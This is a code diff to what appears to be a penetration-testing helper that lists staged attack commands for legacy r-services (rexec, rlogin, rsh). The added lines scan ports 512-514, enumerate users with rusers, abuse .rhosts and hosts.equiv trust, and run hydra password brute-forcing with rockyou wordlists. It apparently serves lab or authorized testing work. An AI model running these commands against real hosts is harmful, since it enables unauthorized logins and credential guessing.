@@ -5144,11 +5144,16 @@ _STEP_COMMANDS = {
     },
     "rservices": {
         1: [
+            "nmap -p512,513,514 -sV <RHOST>",
+            "rusers -al <RHOST>   # list logged-in users -> candidate names for trust/brute",
             "rlogin -l <USER> <RHOST>",
             "rsh <RHOST> -l <USER> id",
+            "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt rexec://<RHOST> -t 4 -f   # rexec (512) is password-auth; msf alt: scanner/rservices/rexec_login",
         ],
         2: [
-            "rsh <RHOST> -l root id   # abuse ~/.rhosts or /etc/hosts.equiv trust",
+            "rsh <RHOST> -l root id   # abuse ~/.rhosts or /etc/hosts.equiv trust (needs your LOCAL username to match a trusted user; '+ +' entry = anyone)",
+            "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt rlogin://<RHOST> -t 4 -f",
+            "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt rsh://<RHOST> -t 4 -f",
         ],
         3: [
             "# HackTricks r-services: https://book.hacktricks.xyz/network-services-pentesting/512-pentesting-rexec",
